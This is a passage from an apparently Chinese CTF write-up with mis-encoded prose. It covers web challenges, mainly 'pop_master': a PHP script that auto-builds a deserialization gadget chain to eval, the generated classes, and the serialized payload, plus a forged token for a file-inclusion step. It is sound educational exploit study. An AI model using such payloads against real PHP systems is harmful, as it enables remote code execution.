class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$token</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ getUid å‡½æ•°å†…æ–°å¢ä¸€è¡Œä»£ç ï¼ŒåŠ¨æ€è°ƒè¯•åˆ° setUid å³å¯å¾—åˆ°æœ‰æ•ˆçš„ <code>Tudou_TOKEN</code>ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8D%8A%84%7B%8E%9Ch%AB%8C%E0u%97%B3%9B%85%97%B2%7D%A7h%87txs</span><br></pre></td></tr></table></figure><p>å°†æ¶æ„ html ä¸Šä¼ åˆ° /tmp ç›®å½•ä¸‹ï¼Œå‘èµ·æ–‡ä»¶åŒ…å«è¯·æ±‚å³å¯è·å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623606478616/a04c24823b8a7cf29bdbc8a7c2d3221eec28ee82.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;82807831-5195-403d-b401-f180736ebea9&#125;</span><br></pre></td></tr></table></figure><h3 id="pop-master"><a href="#pop-master" class="headerlink" title="pop_master"></a>pop_master</h3><p>é¢˜ç›®ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//class.php.txt</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$class</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$class</span>-&gt;yuAp2O(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>class.php.txt ä¸­æ˜¯ç»è¿‡æ··æ·†çš„ç±»ï¼Œå†™ä¸ªè„šæœ¬ä¸€æŠŠæ¢­å›æº¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;memory_limit&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CLASS_FILENAME = <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$CLASS_FILE</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$classes</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$CLASS_FILE</span> = file_get_contents(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> CLASS_FILENAME;</span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generate a class PHP code as a node</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $class string class name</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name in the class</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $jmpClass string next node to jump to</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string generated class PHP code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GenerateClass</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$class</span>, <span class="keyword">string</span> <span class="variable">$functionName</span>, <span class="keyword">string</span> <span class="variable">$jmpClass</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    (<span class="variable">$jmpClass</span> != <span class="string">&quot;&quot;</span>) ?</span><br><span class="line">        (<span class="string">&quot;class <span class="subst">&#123;$class&#125;</span>&#123;public function __construct()&#123;\$this-&gt;<span class="subst">&#123;$functionName&#125;</span>=new <span class="subst">&#123;$jmpClass&#125;</span>();&#125;&#125;&quot;</span>) :</span><br><span class="line">        (<span class="string">&quot;class <span class="subst">&#123;$class&#125;</span>&#123;public function __construct()&#123;\$this-&gt;<span class="subst">&#123;$functionName&#125;</span>=\&quot;None\&quot;;&#125;&#125;&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Find a class with specified function in it</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name to find</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed class that contains the function or false if no class contains</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindClassByFunction</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="variable">$functions</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$function</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$function</span>, <span class="keyword">array</span>(<span class="variable">$functionName</span>)))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$class</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Backtrace to find the path to eval</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name which is start of backtrack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool false if none path found yet || none if path found which would have written to exp.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BackTrace</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$CLASS_FILE</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$classes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="variable">$functions</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">        <span class="variable">$variables</span> = get_class_vars(<span class="variable">$class</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$function</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$function</span>, <span class="keyword">array</span>(<span class="variable">$functionName</span>)))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$jmpFunction</span> = array_keys(<span class="variable">$variables</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="variable">$rule_0</span> = <span class="string">&quot;/public function <span class="subst">$functionName</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                preg_match_all(<span class="variable">$rule_0</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="variable">$rule_1</span> = <span class="string">&#x27;/\$this-&gt;&#x27;</span> . <span class="variable">$jmpFunction</span> . <span class="string">&#x27;-&gt;([a-zA-Z0-9]&#123;6&#125;)\(/&#x27;</span>;</span><br><span class="line">                preg_match_all(<span class="variable">$rule_1</span>, <span class="variable">$content</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$matches</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(count(<span class="variable">$matches</span>[<span class="number">1</span>]) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable">$next_method_list</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span>(<span class="variable">$next_method_list</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">                        <span class="variable">$extractFunctionContents</span> = <span class="string">&quot;/public function <span class="subst">$v</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                        preg_match_all(<span class="variable">$extractFunctionContents</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$functionContent</span>);</span><br><span class="line">                        <span class="variable">$params</span> = <span class="string">&quot;\\&quot;</span> . <span class="variable">$functionContent</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$extractRightOp</span> = <span class="string">&quot;/<span class="subst">$params</span>=(.*?);/&quot;</span>;</span><br><span class="line">                        preg_match_all(<span class="variable">$extractRightOp</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$rightOp</span>);</span><br><span class="line">                        <span class="keyword">if</span>(count(<span class="variable">$rightOp</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// if none right operator when eval is valid</span></span><br><span class="line">                        <span class="variable">$isDestination</span> = preg_match(<span class="string">&quot;/eval\((.*?)\);/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]) &amp;&amp; !preg_match(<span class="string">&quot;/=&#x27;/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">                        <span class="variable">$step</span> = FindClassByFunction(<span class="variable">$v</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$isDestination</span>)&#123;</span><br><span class="line">                            array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line">                            file_put_contents(<span class="string">&quot;exp.php&quot;</span>, <span class="string">&quot;&lt;?php&quot;</span> . PHP_EOL . implode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$result</span>) . PHP_EOL . <span class="string">&quot;echo serialize(new PADDING());&quot;</span>);</span><br><span class="line">                            <span class="keyword">die</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$step</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                            array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span>(!BackTrace(<span class="variable">$v</span>))&#123;</span><br><span class="line">                                array_pop(<span class="variable">$result</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">elseif</span>(count(<span class="variable">$matches</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable">$destinationFunction</span> = <span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$extractFunctionContents</span> = <span class="string">&quot;/public function <span class="subst">$destinationFunction</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                    preg_match_all(<span class="variable">$extractFunctionContents</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$functionContent</span>);</span><br><span class="line">                    <span class="variable">$params</span> = <span class="string">&quot;\\&quot;</span> . <span class="variable">$functionContent</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$extractRightOp</span> = <span class="string">&quot;/<span class="subst">$params</span>=(.*?);/&quot;</span>;</span><br><span class="line">                    preg_match_all(<span class="variable">$extractRightOp</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$rightOp</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// eval arg has been padded, invalid.</span></span><br><span class="line">                    <span class="keyword">if</span>(count(<span class="variable">$rightOp</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$isDestination</span> = preg_match(<span class="string">&quot;/eval\((.*?)\);/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">                        &amp;&amp; !preg_match(<span class="string">&quot;/=&#x27;/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$isDestination</span>)&#123;</span><br><span class="line">                        array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                        file_put_contents(<span class="string">&quot;exp.php&quot;</span>, <span class="string">&quot;&lt;?php&quot;</span> . PHP_EOL . implode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$result</span>) . PHP_EOL . <span class="string">&quot;echo serialize(new PADDING());&quot;</span>);</span><br><span class="line">                        <span class="keyword">die</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$step</span> = FindClassByFunction(<span class="variable">$destinationFunction</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$step</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                        array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line">                        <span class="keyword">if</span>(!BackTrace(<span class="variable">$destinationFunction</span>))&#123;</span><br><span class="line">                            array_pop(<span class="variable">$result</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BackTrace(<span class="string">&quot;yuAp2O&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ä»£ç æ•´ç†åå¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vPFL76</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;NwyYaGg=<span class="keyword">new</span> KUGigF();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUGigF</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;yeibvDG=<span class="keyword">new</span> rMo15X();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rMo15X</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;FK5IgDD=<span class="keyword">new</span> cGInXd();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cGInXd</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;pazgAVc=<span class="keyword">new</span> Akn5g6();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Akn5g6</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;HRHFKR3=<span class="keyword">new</span> ox6mgh();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ox6mgh</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;yHSRG7p=<span class="keyword">new</span> UvIezc();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UvIezc</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;G6ci7az=<span class="keyword">new</span> a68xiw();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a68xiw</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;ndGFMQ7=<span class="keyword">new</span> xSroRa();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xSroRa</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;oXHWucx=<span class="keyword">new</span> aCWT05();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aCWT05</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;HGtml2m=<span class="keyword">new</span> yDIcsa();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yDIcsa</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;EQLf6vK=<span class="keyword">new</span> pkszNY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkszNY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;NU3qxgm=<span class="keyword">new</span> tHRECm();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tHRECm</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;niY1imT=<span class="keyword">new</span> xwg8HP();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xwg8HP</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;UPxY7Rh=<span class="keyword">new</span> uwsYxI();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">uwsYxI</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;O6oCtiA=<span class="keyword">new</span> MxQ8vY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MxQ8vY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;z4n5cgd=<span class="keyword">new</span> v9zyqI();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">v9zyqI</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;lXmIYTK=<span class="keyword">new</span> ZQTdEz();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZQTdEz</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;tfRml9G=<span class="keyword">new</span> sXLGZq();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sXLGZq</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;pwGsvpx=<span class="keyword">new</span> gdK3FL();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gdK3FL</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;XPiW7lc=<span class="keyword">new</span> Wu1LLY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wu1LLY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;SqZ7tgA=<span class="keyword">new</span> e5RFzb();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e5RFzb</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> vPFL76());</span><br></pre></td></tr></table></figure><p>å°†åºåˆ—åŒ–å­—ç¬¦ä¸²ç”Ÿæˆå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;vPFL76&quot;:1:&#123;s:7:&quot;NwyYaGg&quot;;O:6:&quot;KUGigF&quot;:1:&#123;s:7:&quot;yeibvDG&quot;;O:6:&quot;rMo15X&quot;:1:&#123;s:7:&quot;FK5IgDD&quot;;O:6:&quot;cGInXd&quot;:1:&#123;s:7:&quot;pazgAVc&quot;;O:6:&quot;Akn5g6&quot;:1:&#123;s:7:&quot;HRHFKR3&quot;;O:6:&quot;ox6mgh&quot;:1:&#123;s:7:&quot;yHSRG7p&quot;;O:6:&quot;UvIezc&quot;:1:&#123;s:7:&quot;G6ci7az&quot;;O:6:&quot;a68xiw&quot;:1:&#123;s:7:&quot;ndGFMQ7&quot;;O:6:&quot;xSroRa&quot;:1:&#123;s:7:&quot;oXHWucx&quot;;O:6:&quot;aCWT05&quot;:1:&#123;s:7:&quot;HGtml2m&quot;;O:6:&quot;yDIcsa&quot;:1:&#123;s:7:&quot;EQLf6vK&quot;;O:6:&quot;pkszNY&quot;:1:&#123;s:7:&quot;NU3qxgm&quot;;O:6:&quot;tHRECm&quot;:1:&#123;s:7:&quot;niY1imT&quot;;O:6:&quot;xwg8HP&quot;:1:&#123;s:7:&quot;UPxY7Rh&quot;;O:6:&quot;uwsYxI&quot;:1:&#123;s:7:&quot;O6oCtiA&quot;;O:6:&quot;MxQ8vY&quot;:1:&#123;s:7:&quot;z4n5cgd&quot;;O:6:&quot;v9zyqI&quot;:1:&#123;s:7:&quot;lXmIYTK&quot;;O:6:&quot;ZQTdEz&quot;:1:&#123;s:7:&quot;tfRml9G&quot;;O:6:&quot;sXLGZq&quot;:1:&#123;s:7:&quot;pwGsvpx&quot;;O:6:&quot;gdK3FL&quot;:1:&#123;s:7:&quot;XPiW7lc&quot;;O:6:&quot;Wu1LLY&quot;:1:&#123;s:7:&quot;SqZ7tgA&quot;;O:6:&quot;e5RFzb&quot;:0:&#123;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‘é€å«æœ‰è½½è·çš„è¯·æ±‚å³å¯è·å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623642251074/d19177d6d106405812c88903810415d786cbdda5.png" alt="image-20210614114407478"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85e385d3-46be-4e29-b005-3e54f85d2370&#125;</span><br></pre></td></tr></table></figure><h3 id="WhereIsUWebShell"><a href="#WhereIsUWebShell" class="headerlink" title="WhereIsUWebShell"></a>WhereIsUWebShell</h3><p>é¢˜ç›®ç»™å‡ºäº†å¦‚ä¸‹æºä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 